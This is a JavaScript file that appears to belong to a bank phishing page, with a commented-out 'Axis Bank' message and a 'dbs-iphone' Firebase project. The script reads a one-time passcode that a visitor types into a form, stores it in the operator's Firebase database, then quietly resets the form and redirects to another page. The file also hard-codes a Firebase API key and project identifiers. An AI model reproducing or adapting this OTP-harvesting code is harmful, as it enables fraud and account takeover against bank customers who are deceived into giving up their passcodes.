// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyB5VvIXhauUC9R1rikG50_QRy4D-Pm3oYk",
  authDomain: "dbs-iphone.firebaseapp.com",
  databaseURL: "https://dbs-iphone-default-rtdb.firebaseio.com",
  projectId: "dbs-iphone",
  storageBucket: "dbs-iphone.appspot.com",
  messagingSenderId: "511182041695",
  appId: "1:511182041695:web:39f1c479993dd143a2e1ea",
  
  
      
  
    };
  
  firebase.initializeApp(firebaseConfig);
  
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var otp = getInputVal('otp');
  
    // Save message
    saveMessage(otp);
  
    // Show alert
  // alert("Axis Bank Will Contact You Soon")
  //   // Clear form
  //   document.getElementById('contactForm').reset();
  
  document.getElementById('contactForm').reset();
  window.location.href="sad1.html";
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(otp){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      otp: otp,
    });
  }
  